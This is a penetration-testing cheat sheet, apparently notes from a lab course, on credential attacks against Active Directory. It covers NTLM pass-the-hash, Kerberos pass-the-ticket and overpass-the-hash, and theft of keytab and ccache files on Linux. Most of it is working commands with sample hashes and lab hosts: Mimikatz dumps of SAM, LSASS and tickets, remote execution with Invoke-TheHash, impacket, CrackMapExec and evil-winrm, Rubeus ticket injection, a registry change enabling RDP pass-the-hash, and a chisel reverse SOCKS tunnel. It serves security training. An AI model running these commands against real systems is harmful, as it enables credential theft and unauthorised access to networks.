#NTLM
## [Windows NTLM](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)
Set of security protocols that authenticates users identities while protecting the integrity and confidentiality of their data. 
NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol. 

Number of known flaws but is still commonly used to ensure backwards compatibility.
Kerberos has taken over as the default authentication methods in Windows 2000 and subsequent in AD domains. 

Passwords stored on the server and domain controllers are not salted. Allows an adversary with a password hash to authenticate a session without knowing the original password. 

#PtH 
## [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/)
You can use a password hash instead of a plain text password for authentication. 
- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).
#MimiKatz
### Mimikatz
Has a module named sekurlsa::pth
Required options:
`/user:<user>` - The name of the user to impersonate 
`/rc4 or /NTLM:<hash>` - Hash to impersonate 
`/domain:<domain>` - The domain the user belongs to or localhost
`/run` - program we want to run with the users context.

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
#SAM
#### Dump SAM
```cmd
reg save HKLM\SAM sambkup.hiv
reg save HKLM\SYSTEM systembkup.hiv

mimikatz.exe lsadump::sam /sam:sambkup.hiv /system:systembkup.hiv
```
#### Dump Passwords 
```cmd 
mimikatz.exe privilege::debug "sekurlsa::logonPasswords full"
```
### [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
Can use SMB or WMI command execution.
- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

##### Invoke-TheHash SMB
```powershell
cd C:\tools\Invoke-TheHash\

Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target <target> -Domain <domain> -Username <user> -Hash <hash> -Command "command" -Verbose
```

Get a reverse shell with the command?

##### Invoke-TheHash WMI
```powershell
Import-Module .\Invoke-TheHash.psd1
```

```powershell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "command"
```

### Impacket PtH (Linux)
```shell
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
[impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
[impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
[impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### CrackMapExec PtH
```shell
 crackmapexec smb 172.16.1.0/24 -u Administrator -d localhost -H 30B3783CE2ABF1AF70F77D0660CF3453
```
##### Authenticate to each host in subnet?
Add the `--local-auth`
##### Command Execution 
```shell
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
### evil-winrm
```shell
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
Need to include domain for domain accounts
administrator@inlanefreight.htb

### #PtH with RDP Linux 

PtH to gain GUI access
Restricted Admin Mode, needs to be enabled.

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /scale-desktop:200 /scale:180 /scale-desktop:200 /scale:180
```

### #UAC Limits 

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

# Kerberos Protocol
#Kerberos
Idea is to not give an account password to every service you use. Instead Kerberos keeps all tickets on the local system and presents each service the specific ticket for that service. 
This prevents a ticket being used for 2 service. 

- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

To Request a TGT they must authenticate with the DC by encrypting the current timestamp with their password hash.
The DC can validate the identity as they know the hash and will then send a TGT for future requests. 
After this ticket, they do not need to prove who they are with their password. 
If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

## [Pass the Ticket (PtT) from Windows](https://attack.mitre.org/techniques/T1550/003/)

#### Harvesting Tickets 
Tickets that end in $ are computer account, 
User tickets have the user name followed by a @ that seperates the service name and domain. 
	`[randomvalue]-username@service-domain.local.kirbi`.
To get all tickets will need to execute as admin

##### #MimiKatz
```cmd
mimikatz.exe privilige::debug "sekurlsa::tickets /export"
```
##### Rebues.exe
```cmd
Ruebues.exe dump /nowrap
```

### Pass the Key or OverPass the Hash
Converts a hash/key for a domain-joined user into a full Ticket-Granting-Ticket (TGT)
#### Mimikatz 
```cmd
privilege::debug

sekurlsa::ekeys
```
Create a cmd.exe to request access to any service for the target user
```cmd
sekurlsa::pth /domain:<domain> /user:<user> /ntlm:hash
```
	Mimikatz requires admin privileges and rubeus doesn't to PtK
```cmd
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

### Pass the Ticket 
#### #Rubeus
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
Using Base64
```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

```cmd
Rubeus.exe ptt /ticket:<ticket>
```

#### MimiKatz 
```cmd 
privilige::debug 

kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
#### PowerShell Remoting 
Run scripts or commands on a remote computer 
##### Mimikatz
```cmd 
mimikatz.exe

privilige::debug 

kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

exit

powershell 
```
```powershell
Enter-PSSession -ComputerName DC01
```
##### Rubeus
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

powershell
```
```powershell
Enter-PSSession -ComputerName DC01
```

## Pass The Ticket (PtT) from Linux

Linux computers can connect to active directories to provide centralised identity management. 
Uses Kerberos as authentication 

### Kerberos On Linux 
Tickets stored as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in /tmp
By default stored in environmental variable KRB5CCNAME

Files protected by read/ write permissions

##### [Keytab Files](https://kb.iu.edu/d/aumh)
A File that contains pairs of kerberos principals and encrypted keys. 
Can authenticate many remote systems using Kerberos. 

Commonly allow scripts to authenticate automatically without human interaction. 

#### Attack
Check if Linux machine is domain joined 
```shell
realm list
```
[sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) if realm is not installed
```shell
ps -ef | grep -i "winbind\|sssd"
```

##### Finding Kerberos tickets on Linux
Search for files wiht keytab in the name (cp )
```shell
find / -name *keytab* -ls 2>/dev/null
```
*Need read write privs*

Identify Keytab files in cronjobs
```shell
crontab -l
```
Look for [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html)
	Allows for interaction with Kerberos 
	Functions to request users TGT and store in cache (ccache)
##### Abusing #KeyTab Files 
List keytab File information 
```shell
klist -k -t 
```

Impersonate A User 
```shell
klist
```
```shell-session
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
```shell-session
klist
```


Connect to SMB Shares 
```shell
smbclient //dc01/carlos -k -c ls
```

##### KeyTab Extract 
[KeyTabExtract.py](https://github.com/sosdave/KeyTabExtract)
```shell
python3 keytabextract.py *.keytab
```
##### Abusing KeyTab ccache
Need to be root

###### Finding ccache Files 
Holds kerberos credentials 
```shell
env | grep -i krb5
```

```shell
ls -la /tmp
```

located in /tmp
```shell
id julio@inlanefreight.htb
```
Import ccache files into current session
```shell
klist
```
```shell
cp /tmp/krb5cc_647401106_I8I133 .
```
```shell-session
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```
```shell-session
klist
```

### Linux Attack Tools with Kerberos 
#### Setup
Need to ensure KRB5CCNAME enviroment variable is to the ccache file we want.
Need to make sure attack host can talk to KDC/DC for name resolution.  
	Need to proxy traffic?
```shell
cat /etc/hosts
```
Need to proxy socks5 through port 1080
```shell
cat /etc/proxychains.conf
```

```shell
gzip -d chisel_1.7.7_linux_amd64.gz

mv chisel_* chisel && chmod +x ./chisel

sudo ./chisel server --reverse 
```
example:
```
chisel server --port 8000 --socks5 --reverse

.\chisel.exe client --max-retry-count 1 10.10.15.23:8000 R:socks
```


Connect to foothold machine 
```shell

xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution /scale-desktop:200 /scale:180
```
Point proxy to it 
```cmd
chisel.exe client <attack ip>:8080 R:socks
```

Set the KRB5CCNAME Enviromental Variable 
```shell
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
#### Impacket 
#impacket
```shell
proxychains impacket-wmiexec dc01 -k
```

#### Evil-Winrm
May need to install Kerberos Auth Package 
```shell
sudo apt-get install krb5-user -y
```

Change configuration
`/etc/krb5.conf`

```shell
cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

```

```shell
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

#### Impacket Ticket Converter 
```shell
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
Convert to Kirbi

##### Reverse Operation 
```cmd
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

#### [Linikatz](https://github.com/CiscoCXSecurity/linikatz)

```shell
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh

/opt/linikatz.sh
```



